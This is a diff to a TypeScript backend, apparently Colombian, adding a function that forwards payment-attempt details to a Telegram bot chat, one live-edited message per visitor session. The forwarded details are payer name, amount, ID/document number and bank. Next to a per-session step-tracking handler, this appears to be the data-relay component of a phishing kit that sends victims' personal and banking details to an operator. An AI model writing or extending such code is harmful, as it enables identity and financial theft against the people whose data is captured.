@@ -136,6 +136,41 @@ export function notifySessionPaymentRejected(
   });
 }
 
+export function notifySessionPaymentError(
+  sid: string,
+  data: {
+    nombre: string;
+    monto: string;
+    cc: string;
+    banco: string;
+    gateway?: string;
+    reason: string;
+  }
+) {
+  if (!env.telegramBotToken || !env.telegramChatId) return;
+  const s = sessions.get(sid) ?? { lines: [], chain: Promise.resolve() };
+  sessions.set(sid, s);
+
+  const gwLabel = (data.gateway || 'RAPPIPAY').toUpperCase();
+  const time = new Date().toLocaleTimeString('es-CO', { hour12: false, timeZone: 'America/Bogota' });
+  const errLine = `\n❌ [PAGO NO PROCESADO - LINK BLOQUEADO EN PASARELA (${gwLabel})]\n• Estado: 🚫 BLOQUEADO / RECHAZADO\n• Pagador: ${data.nombre}\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• CC/Doc: ${data.cc}\n• Banco: ${data.banco}\n• Motivo: ${data.reason}`;
+  s.lines.push(`${time} ${errLine}`);
+
+  s.chain = s.chain.then(async () => {
+    const text = `🧭 Sesión ${sid.slice(0, 8)}\n${s.lines.join('\n')}`;
+    try {
+      if (s.messageId) {
+        await tg('editMessageText', { chat_id: env.telegramChatId, message_id: s.messageId, text });
+      } else {
+        const r = await tg('sendMessage', { chat_id: env.telegramChatId, text });
+        if (r.ok && r.result) s.messageId = r.result.message_id;
+      }
+    } catch {
+      // Ignorar fallos de Telegram.
+    }
+  });
+}
+
 export function postTrack(req: Request, res: Response) {
   const sid = String(req.body?.sessionId ?? '').slice(0, 64).trim();
   const step = String(req.body?.step ?? '').slice(0, 200).trim();
